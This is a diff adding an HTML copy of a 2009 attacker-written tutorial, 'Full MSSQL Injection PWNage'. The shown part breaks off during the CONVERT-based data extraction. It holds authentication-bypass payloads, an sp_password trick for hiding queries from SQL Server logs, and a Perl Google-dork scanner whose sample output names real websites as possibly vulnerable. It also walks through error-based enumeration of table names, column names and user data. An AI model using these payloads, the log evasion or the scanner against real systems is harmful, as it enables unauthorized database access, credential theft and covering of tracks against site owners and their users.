@@ -1,0 +1,1488 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>XD-Blog Tutorial</title>
+</head><body><div style="text-align: left"><span style="font-size: 12pt"><span style="font-family: Lucida Grande"><br/>
+		|=--------------------------------------------------------------------=|<br/>
+		|=----------------=[ Full MSSQL Injection PWNage ]=-----------------=|<br/>
+		|=-----------------------=[ 28 January 2009 ]=------------------------=|<br/>
+		|=---------------------=[ By CWH Underground ]=---------------------=|<br/>
+		|=--------------------------------------------------------------------=|<br/>
+				<br/>
+<br/>
+######<br/>
+Info<br/>
+######<br/>
+<br/>
+Title	: Full MSSQL Injection PWNage<br/>
+Author	: ZeQ3uL &amp;&amp; JabAv0C<br/>
+Team  : CWH Underground [www.milw0rm.com/author/1456]<br/>
+Website	: cwh.citec.us / www.citec.us<br/>
+Date	: 2009-01-28<br/>
+<br/>
+<br/>
+##########<br/>
+Contents<br/>
+##########<br/>
+<br/>
+ [0x00] - Introduction<br/>
+<br/>
+ [0x01] - Know the Basic of SQL injection<br/>
+<br/>
+	[0x01a] - Introduction to SQL Injection Attack<br/>
+	[0x01b] - How to Test sites that are Vulnerable in SQL Injection<br/>
+	[0x01c] - Bypass Authentication with SQL Injection<br/>
+	[0x01d] - Audit Log Evasion<br/>
+	[0x01e] - (Perl Script) SQL-Google searching vulnerable sites <br/>
+<br/>
+ [0x02] - MSSQL Normal SQL Injection Attack<br/>
+	<br/>
+	[0x02a] - ODBC Error Message Attack with &quot;HAVING&quot; and &quot;GROUP BY&quot;<br/>
+	[0x02b] - ODBC Error Message Attack with &quot;CONVERT&quot;<br/>
+	[0x02c] - MSSQL Injection with UNION Attack<br/>
+	[0x02d] - MSSQL Injection in Web Services (SOAP Injection)<br/>
+<br/>
+ [0x03] - MSSQL Blind SQL Injection Attack<br/>
+	<br/>
+	[0x03a] - How to Test sites that are Vulnerable in Blind SQL Injection<br/>
+	[0x03b] - Determine data through Blind SQL Injection<br/>
+	[0x03c] - Exploit Query for get Table name <br/>
+	[0x03d] - Exploit Query for get Column name<br/>
+<br/>
+ [0x04] - More Dangerous SQL Injection Attack<br/>
+<br/>
+	[0x04a] - Dangerous from Extended Stored Procedures<br/>
+	[0x04b] - Advanced SQL Injection Techniques<br/>
+	[0x04c] - Mass MSSQL Injection Worms<br/>
+<br/>
+ [0x05] - MSSQL Injection Cheat Sheet<br/>
+<br/>
+ [0x06] - SQL Injection Countermeasures<br/>
+<br/>
+ [0x07] - References<br/>
+<br/>
+ [0x08] - Greetz To<br/>
+<br/>
+<br/>
+#######################<br/>
+[0x00] - Introduction<br/>
+#######################<br/>
+<br/>
+	Welcome reader, this paper is a short attempt at documenting a practical technique <br/>
+we have been working on. This papers will guide about technique that allows the attackers <br/>
+(us) gaining access into the process of exploiting a website via SQL Injection Techniques<br/>
+that we focused on MSSQL only<br/>
+<br/>
+	This paper is divided into 8 sections but only from section 0x01 to 0x06<br/>
+are about technical information.<br/>
+<br/>
+	Section 0x01, we talk about basic knowledge of SQL injection vulnverabilities which<br/>
+are classified into two types, normal and blind. Section 0x02, we give a detail of each way <br/>
+attacking through SQL injection. Section 0x03, we explain the way to enumerate data through <br/>
+blind sql injection technique. Section 0x04, we show more dangerous approaches which can occur <br/>
+through SQL injection vulnerabilities. Section 0x05, we collect MSSQL queries in several purposes.<br/>
+Section 0x06, we offer some tips in order to prevent the system from SQL injection attack.<br/>
+<br/>
+<br/>
+##########################################<br/>
+[0x01] - Know the Basic of SQL injection<br/>
+##########################################<br/>
+	<br/>
+	SQL injection vulnerabilities occur when the database server can be made to execute arbitrary SQL <br/>
+(Structured Query Language) commands. Typically executed through the web application front end (use interface,<br/>
+form, etc.), the attack involves entering malformed or unexpected SQL statements which result in unauthorized<br/>
+execution of SQL commands on the database server. <br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x01a] - Introduction to SQL Injection Attack<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	<br/>
+		SQL injection attacks occur when malicious SQL commands are injected into a predefined SQL query <br/>
+	in order to alter the outcome of the query. Take the example of an application that requests a user id <br/>
+	for authentication. The application adds this user ID to a predefined SQL query to perform authentication. <br/>
+	<br/>
+		However, if instead of providing a valid user name the attacker inputs a specialized SQL command <br/>
+	that forces the termination of the predefined SQL query and forces the execution of a new SQL query. In this <br/>
+	way the attacker can execute any SQL command on the host system without even needing to log in. <br/>
+	<br/>
+		A successful SQL injection exploit can read sensitive data from the database, modify database data <br/>
+	(Insert/Update/Delete), execute administration operations on the database (such shutdown the DBMS), recover <br/>
+	the content of a given file present on the DBMS filesystem and in some cases issue commands to the operating system. <br/>
+	<br/>
+		An application is vulnerable to SQL injection attack when:<br/>
+			- User input is incorrectly filtered for string literal escape characters embedded in SQL statements.<br/>
+			- User input is either not restricted ? e.g. through strong typing - and thereby can be made to execute<br/>
+			 in an unexpected manner<br/>
+	<br/>
+		SQL Injection always occur in application that needs to talk to a Database include:<br/>
+			- Authentication forms (Login Pages)<br/>
+			- Search forms<br/>
+			- E-Commerce sites<br/>
+			- Forum / Webboard<br/>
+			- Content Manage System (CMS's that use DB),Such as: <br/>
+				Joomla Components (http://www.milw0rm.com/search.php?dong=joomla)<br/>
+				Mambo Components (http://www.milw0rm.com/search.php?dong=mambo)<br/>
+				Wordpress Plugin (http://www.milw0rm.com/search.php?dong=wordpress)<br/>
+<br/>
+	<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x01b] - How to Test sites that are vulnerable in SQL Injection<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	<br/>
+		We must make a list of all input fields whose values could be used in crafting a SQL query, <br/>
+	including the hidden fields of POST requests and then test them separately, trying to interfere with <br/>
+	the query and to generate an error. The very first test usually consists of adding a single quote (') <br/>
+	, double quote (&quot;&quot;) or a semicolon (;) to the field under test. <br/>
+	<br/>
+	[Simple URL] http://www.example.com/news.asp?id=10<br/>
+	[Test SQLi] http://www.example.com/news.asp?id=10'<br/>
+<br/>
+		It's vulnerable in SQL injection,If the output some error like this:<br/>
+	<br/>
+	[HTTP Response]-----------------------------------------------------------------------------<br/>
+	Microsoft OLE DB Provider for ODBC Drivers error '80040e14'<br/>
+	[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the <br/>
+	character string ''.<br/>
+	/news.asp, line 52<br/>
+	[End HTTP Response]-------------------------------------------------------------------------<br/>
+<br/>
+		Next solution, Use &quot;OR/AND&quot; Operation for testing SQL injection vulnerability:<br/>
+<br/>
+		If contains is the different as original URL that dump all data <br/>
+	from database, It's vulnerable in SQL injection.<br/>
+<br/>
+	[Simple URL] http://www.example.com/news.asp?id=2<br/>
+<br/>
+	[output]------------------------------------------------------------------------------------<br/>
+	News: 2<br/>
+	Details: Preventing blind SQL injection attacks, Most security professionals know ... <br/>
+	[End Output]--------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+	[Test SQLi] http://www.example.com/news.asp?id=2' or '1'='1<br/>
+<br/>
+	[output]------------------------------------------------------------------------------------<br/>
+	News: 1<br/>
+	Details: SQL injection attack infects hundreds of thousands of websites ...<br/>
+<br/>
+	News: 2<br/>
+	Details: Preventing blind SQL injection attacks, Most security professionals know ... <br/>
+	<br/>
+	News: 3<br/>
+	Details: Mass SQL injection, There's another round of mass SQL injections going on which has infected ...<br/>
+	<br/>
+	News: 4<br/>
+	Details: New Botnet Malware Spreading SQL injection attack tool ...<br/>
+	[End Output]--------------------------------------------------------------------------------<br/>
+<br/>
+		That's Great !! Can you see something different from original URL ? (It's Vuln in SQL Injection Attacks),<br/>
+	It's return all query from DB, Why ??<br/>
+<br/>
+	[ASP_code]<br/>
+	var sql = &quot;SELECT * FROM news WHERE id = '&quot; + getid +&quot;'&quot;;<br/>
+	[End ASP_code]<br/>
+<br/>
+	[Final query //id=2]<br/>
+	SELECT * FROM news WHERE id = '2'		// It's will return News 2<br/>
+	[End id=2]<br/>
+<br/>
+	[Final query //id=2' or 'a'='a]			// Testing SQLi Vuln<br/>
+	SELECT * FROM news WHERE id = '2' or 'a'='a'	// It's include ' or 'a'='a into SQL statement and the condition is TRUE,<br/>
+							// So It will return all news (id=1,2,3,...)<br/>
+	[End id=2' or 'a'='a]<br/>
+<br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x01c] - Bypass Authentication with SQL Injection<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		This basic technique for &quot;bypass Login&quot; when application use DB to checking authentication.<br/>
+	However, an attacker may possibly bypass this check with SQL injection.<br/>
+	<br/>
+	[Example scripts]<br/>
+<br/>
+	+-----------------------------+<br/>
+	|	 ' or 1=1 --	   |<br/>
+	|	 a' or 1=1 --	   |<br/>
+	|	 &quot; or 1=1 --	   |<br/>
+	|	 a&quot; or 1=1 --	   |<br/>
+	|	 ' or 1=1 #	   |<br/>
+	|	 &quot; or 1=1 #	   |<br/>
+	|	 or 1=1 --	   |<br/>
+	|	 ' or 'x'='x	   |<br/>
+	|	 &quot; or &quot;x&quot;=&quot;x	   |<br/>
+	|	 ') or ('x'='x	   |<br/>
+	|	 &quot;) or (&quot;x&quot;=&quot;x	   |<br/>
+	| ' or username LIKE '%admin% |<br/>
+	+-----------------------------+<br/>
+	|   USERNAME: ' or 1/*  |<br/>
+	|   PASSWORD: */ =1 --  |<br/>
+	+-----------------------------+<br/>
+	| USERNAME: admin' or 'a'='a |<br/>
+	| PASSWORD: '#		   |<br/>
+	+-----------------------------+<br/>
+<br/>
+	[Login ASP_code]----------------------------------------------------------------------------<br/>
+	var sql = &quot;SELECT * FROM users WHERE username = '&quot; + formusr + &quot;' AND password ='&quot; + formpwd + &quot;'&quot;;<br/>
+	[End Login ASP_code]------------------------------------------------------------------------<br/>
+<br/>
+		When we input something like this:<br/>
+		formusr = admin<br/>
+		formpwd = ' or 'a='a<br/>
+<br/>
+	[SQL Query]---------------------------------------------------------------------------------<br/>
+	SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+<br/>
+		This SQL condition is TRUE and bypass login process, So you don't need admin's password. (Just use ' or 'a'='a)<br/>
+<br/>
+		If we input something like this<br/>
+		formusr = ' or 1=1 -- <br/>
+		formpwd = anything<br/>
+	<br/>
+	[SQL Query]---------------------------------------------------------------------------------<br/>
+	SELECT * FROM users WHERE username = '' or 1=1 -- AND password = 'anything'<br/>
+	[End Code]----------------------------------------------------------------------------------<br/>
+<br/>
+		** Note **<br/>
+<br/>
+		--		is comment operator of MSSQL DB used to comment out everything following this operator.<br/>
+		/*Comment*/	Inline comment, Comments out rest of the query by not closing them / Bypass blacklisting.<br/>
+				<br/>
+				DROP/*comment*/sampletable <br/>
+				DR/**/OP/*bypass blacklisting*/sampletable <br/>
+				SELECT/*avoid-spaces*/password/**/FROM/**/Members<br/>
+<br/>
+<br/>
+		If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then<br/>
+	you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash <br/>
+	of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.<br/>
+		<br/>
+		formusr = admin <br/>
+		formpwd = pass ' AND 1=2 UNION ALL SELECT 'admin', '1a1dc91c907325c69271ddf0c944bc72<br/>
+<br/>
+	1a1dc91c907325c69271ddf0c944bc72 = MD(pass)<br/>
+<br/>
+	+++++++++++++++++++++++++++++<br/>
+	 [0x01d] - Audit Log Evasion<br/>
+	+++++++++++++++++++++++++++++<br/>
+<br/>
+		When we injection some code with SQLi Techniques, All of the SQL queries can be logged and admin can know what's happen ?<br/>
+	The technique for evade logging, We use &quot;sp_password&quot;<br/>
+<br/>
+		formusr = ' or 1=1 -- sp_password<br/>
+		formpwd = anything<br/>
+<br/>
+		SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries <br/>
+	it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible).<br/>
+<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x01e] - (Perl Script) SQL-Google searching vulnerable sites<br/>
+	+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	<br/>
+		The Good way to searching sites that have SQL injection vulnerability is &quot;Google&quot; <br/>
+	(That powerful to use every search engines to searching with IRCbots). We developed simple Perl script for<br/>
+	searching SQL injection holes (MSSQL, Mysql, MS Access, Oracle) name &quot;SQL-Google Search&quot;:<br/>
+<br/>
+	[code]-----------------------------------------------------------------------------------<br/>
+<br/>
+	#!/usr/bin/perl<br/>
+	use LWP::Simple;<br/>
+	use LWP::UserAgent;<br/>
+	use HTTP::Request;<br/>
+	my $sis=&quot;$^O&quot;;if ($sis eq 'MSWin32') { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); } <br/>
+	print &quot;+++++++++++++++++++++++++++++++\n&quot;;<br/>
+	print &quot;+   SQL - Google Search   +\n&quot;;<br/>
+	print &quot;+    CWH Underground    +\n&quot;;<br/>
+	print &quot;+++++++++++++++++++++++++++++++\n\n&quot;;<br/>
+	print &quot;Insert Dork:&quot;;<br/>
+	chomp( my $dork = &lt;STDIN&gt; );<br/>
+	print &quot;Total Query Pages (10 Links/Pages) :&quot;;<br/>
+	chomp( my $page = &lt;STDIN&gt; );<br/>
+	print &quot;\n[+] Result:\n\n&quot;;<br/>
+	for($start = 0;$start != $page*10;$start += 10)<br/>
+	{	<br/>
+	$t = &quot;http://www.google.com/search?hl=en&amp;q=&quot;.$dork.&quot;&amp;btnG=Search&amp;start=&quot;.$start;<br/>
+	  $ua = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla 5.2');<br/>
+	  $ua-&gt;timeout(10);<br/>
+	  $ua-&gt;env_proxy;<br/>
+	  $response = $ua-&gt;get($t);<br/>
+	  if ($response-&gt;is_success)<br/>
+	  {<br/>
+	    $c = $response-&gt;content;<br/>
+	    @stuff = split(/&lt;a href=/,$c);<br/>
+	    foreach $line(@stuff)<br/>
+	    {<br/>
+	      if($line =~/(.*) class=l/ig)<br/>
+	      {<br/>
+	        $out = $1;<br/>
+	        $out =~ s/\&quot;//g;<br/>
+			$out =~s/$/\'/;  <br/>
+			$ua = LWP::UserAgent-&gt;new(agent =&gt; 'Mozilla 5.2');<br/>
+			$ua-&gt;timeout(10);<br/>
+			$ua-&gt;env_proxy;<br/>
+			$response = $ua-&gt;get($out);<br/>
+			$error = $response-&gt;content();<br/>
+			if($error =~m/mysql_/ || $error =~m/Division by zero in/ || $error =~m/Warning:/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MySQL Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft JET Database/ || $error =~m/ODBC Microsoft Access Driver/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MS Access Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft OLE DB Provider for SQL Server/ || $error =~m/Unclosed quotation mark/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in MSSQL Injection!!\n&quot;;}<br/>
+			elsif($error =~m/Microsoft OLE DB Provider for Oracle/)<br/>
+				{print &quot;$out =&gt; Could be Vulnerable in Oracle Injection!!\n&quot;;}<br/>
+		  }<br/>
+		}<br/>
+	  }<br/>
+    }<br/>
+<br/>
+	[End code]----------------------------------------------------------------------------------<br/>
+	<br/>
+	[output]------------------------------------------------------------------------------------<br/>
+	<br/>
+	+++++++++++++++++++++++++++++++<br/>
+	+   SQL - Google Search   +<br/>
+	+    CWH Underground    +<br/>
+	+++++++++++++++++++++++++++++++<br/>
+<br/>
+	Insert Dork:index.asp?sid=<br/>
+	Total Query Pages (10 Links/Pages) :5<br/>
+<br/>
+	[+] Result:<br/>
+<br/>
+	http://www.ris.org.uk/index.asp?sid=7&amp;mid=5' =&gt; Could be Vulnerable in MSSQL Injection!!<br/>
+	http://www.waterbucket.ca/rm/index.asp?type=single&amp;sid=44&amp;id=307' =&gt; Could be Vulnerable in MSSQL Injection!!<br/>
+	http://www.ilri.org/research/Index.asp?SID=4' =&gt; Could be Vulnerable in MSSQL Injection!!<br/>
+	<br/>
+	[End output]--------------------------------------------------------------------------------<br/>
+<br/>
+<br/>
+############################################<br/>
+[0x02] - MSSQL Normal SQL Injection Attack<br/>
+############################################<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x02a] - ODBC Error Message Attack with &quot;HAVING&quot; and &quot;GROUP BY&quot;<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+		<br/>
+		We can use information from error message produced by the MS SQL Server to get almost any data we want. <br/>
+	<br/>
+	- &quot;GROUP BY&quot; is a microsoft sql server command used to group output of particular sql query.<br/>
+	- &quot;HAVING&quot; is a command used to specify a search condition for a group or an aggregate. <br/>
+	 this command is always used with &quot;GROUP BY&quot; otherwise the error will return.<br/>
+<br/>
+		As the operation of these two commands, we can take advantage of them in order to <br/>
+	obtain particular table name and all column names of this table. We will explain you by using an example.<br/>
+<br/>
+		First, The target has a table called &quot;news&quot; and in news, there are three columns, which are news_id, news_author and news_detail.<br/>
+	<br/>
+	The vulnerable page is http://www.example.com/page.asp?id=1<br/>
+	The query in this page is something like <br/>
+<br/>
+		[Query]-----------------------------------------------------------------------------<br/>
+		var query = &quot;SELECT * FROM news WHERE news_id= '&quot; + column+ &quot;'&quot;;<br/>
+		[End query]-------------------------------------------------------------------------<br/>
+<br/>
+	So, we can inject HAVING command in order to observe returned error<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1' HAVING 1=1--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	The query will be <br/>
+<br/>
+		SELECT * FROM news WHERE news_id='1' HAVING 1=1--'<br/>
+<br/>
+	We will get the error as following:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft OLE DB Provider for SQL Server error '80040e14'<br/>
+		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_id' is invalid in <br/>
+		the select list because it is not contained in an aggreate function and there is no GROUP BY clause. <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	In this error, we know table name = &quot;news&quot;, used in this page and <br/>
+	one column name = &quot;news_id&quot;, contained in particular table.<br/>
+	<br/>
+	The error is originate from using HAVING command without GROUP BY command. <br/>
+	Moreover, we can get the other column names by using combination of GROUP BY and HAVING command.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	The query will be<br/>
+<br/>
+		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id HAVING 1=1--'<br/>
+<br/>
+	We will get the error<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft OLE DB Provider for SQL Server error '80040e14'<br/>
+		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_author' is invalid in <br/>
+		the select list because it is not contained in an aggreate function and there is no GROUP BY clause.<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	Now, we know the second column name of table1 = &quot;news_author&quot;. The third column name can be obtained <br/>
+	by adding the second column name in the previous query<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	The query will be<br/>
+<br/>
+		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id,news.news_author HAVING 1=1--'<br/>
+<br/>
+	The request will generate following error<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft OLE DB Provider for SQL Server error '80040e14'<br/>
+		[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'news.news_detail' is invalid in <br/>
+		the select list because it is not contained in an aggreate function and there is no GROUP BY clause.<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	The third column name = &quot;news_detail&quot;, pops up in returned error. If we had more columns, <br/>
+	we could add news_detail in GROUP BY clause of previous request then we could get the forth column name.<br/>
+<br/>
+	When we added all of column in GROUP BY clause, we will get normal result and<br/>
+	we absolutely know that we obtained all column name in table1.<br/>
+<br/>
+	As this example, the request below will generate no error.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author,news_detail HAVING 1=1--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	The query will be<br/>
+<br/>
+		SELECT * FROM news WHERE news_id='1' GROUP BY news.news_id,news.news_author,news_detail HAVING 1=1--'<br/>
+<br/>
+	As no error return, we know that table1 consists of three columns which are &quot;news_id&quot;, &quot;news_author&quot; and &quot;news_detail&quot;.<br/>
+<br/>
+<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+	 [0x02b] - ODBC Error Message Attack with &quot;CONVERT&quot;<br/>
+	++++++++++++++++++++++++++++++++++++++++++++++++++++<br/>
+<br/>
+		In our opinion, MSSQL expresses much information in returned error. It is useful for programmers to debug their application meanwhile <br/>
+	it is valuable for many attackers, as seeing in previous section.<br/>
+<br/>
+		In this section, we provide another method of utilizing from MSSQL error through a command called &quot;convert&quot;.<br/>
+	convert command is used to convert between two data type and when the specific data cannot convert to another type, <br/>
+	this command will return error. let see through an example:<br/>
+<br/>
+	In this example, we show you how to obtain MSSQL_Version, DB_name, User_name.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+	<br/>
+	Error Message returned:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) Feb 9 2007 <br/>
+		22:47:07 Copyright (c) 1988-2005 Microsoft Corporation Express Edition on Windows NT 5.2 (Build 3790: Service Pack 1) <br/>
+		' to data type int.<br/>
+		/page.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+	<br/>
+	Now, We know the version of MSSQL and OS (Windows 2003 Server), Let's go to enumerate DB_name.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+	<br/>
+	Error Message returned:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'cwhdb' to data type int.<br/>
+		/page.asp, line 9<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	We can know the Database name = &quot;cwhdb&quot;, Next is query for get current user that run DB.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	Error Message returned:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'sa' to data type int.<br/>
+		/showthread.asp, line 9<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	W00t!! W00t!!, It use &quot;sa&quot; privileges lol. This information can help us that we can use extended <br/>
+	stored procedure &quot;XP_CMDSHELL&quot; to run arbitrary command executes.<br/>
+<br/>
+<br/>
+	In next example, we show you how to obtain table names, column names and data.<br/>
+<br/>
+	Take a look at our First request<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	&quot;information_schema.tables&quot; stores information about tables in databases and there is a field called &quot;table_name&quot; <br/>
+	which stores names of each table. The result of this request is something like this:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'threads' to data type int.<br/>
+		/page.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+		From the query, we get threads as a nvarchar data type and as it cannot convert from threads to int data type, the error is returned.<br/>
+	Therefore, we know the first table = &quot;threads&quot;, from this error. The next step is looking for the second table. <br/>
+	We only put WHERE clause append the query in above request.<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+<br/>
+		not+in+('threads')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will get an error like this:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'users' to data type int.<br/>
+		/page.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	Again, we know the second table = &quot;users&quot;, from the error. If we want another table, we just append our known table list. for example,<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+table_name+from+information_schema.tables+where+table_name+<br/>
+		not+in+('threads','users')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	And we will get an error:<br/>
+<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'forums' to data type int.<br/>
+		/page.asp, line 9<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	This means the third table = &quot;forums&quot;. On the other hand, if the previous request return something like this.<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		ADODB.Field error '800a0bcd'<br/>
+		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.<br/>
+		/page.asp, line 10<br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	It means this database consists of only two tables, threads and users.<br/>
+<br/>
+		OK, now, we already get all tables. The next target is column names.<br/>
+	The method to retrieve column names is not much different from getting table names.<br/>
+	We merely change from &quot;information_schema.tables&quot; to &quot;information_schema.columns&quot; and from &quot;table_name&quot; to &quot;column_name&quot;<br/>
+	but we have to add &quot;table_name&quot; in WHERE cluase in order to specify the table which we will pull column names from.<br/>
+<br/>
+	Don't talk too much, let see an example<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	From this request, we get an following error<br/>
+	<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'uname' to data type int.<br/>
+		/showthread.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	As the same approach of getting table names, we abruptly know that the first column of table 'users' is &quot;uname&quot;.<br/>
+	For another column name, we add a bit in WHERE clause.<br/>
+<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+<br/>
+		and+column_name+not+in+('uname')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	We will get an below error.<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'upass' to data type int.<br/>
+		/showthread.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	Absolutely we know the second column = &quot;upass&quot;, of table 'users'. For getting more column names, <br/>
+	we only append a known table list like that in getting table names. For example,<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
+		http://www.example.com/page.asp?id=1+and+1=convert(int,(select+top+1+column_name+from+information_schema.columns+where+table_name='users'+<br/>
+		and+column_name+not+in+('uname','upass')))--<br/>
+		[End SQLi]--------------------------------------------------------------------------<br/>
+<br/>
+	The Error message:<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		Microsoft SQL Native Client error '80040e07'<br/>
+		Conversion failed when converting the nvarchar value 'email' to data type int.<br/>
+		/showthread.asp, line 9 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	So, the third column is &quot;email&quot;. but if the error is<br/>
+		<br/>
+		------------------------------------------------------------------------------------<br/>
+		ADODB.Field error '800a0bcd'<br/>
+		Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record.<br/>
+		/page.asp, line 10 <br/>
+		------------------------------------------------------------------------------------<br/>
+<br/>
+	This means no more column left. Next is the real target which attackers want, the data.<br/>
+	If take a look carefully, we will see that the idea is not different from getting table and column.<br/>
+	Use the same manner but change only table and column name.<br/>
+<br/>
+	If we want uname data in table users, we can do like this:<br/>
+		<br/>
+		[SQLi]------------------------------------------------------------------------------<br/>
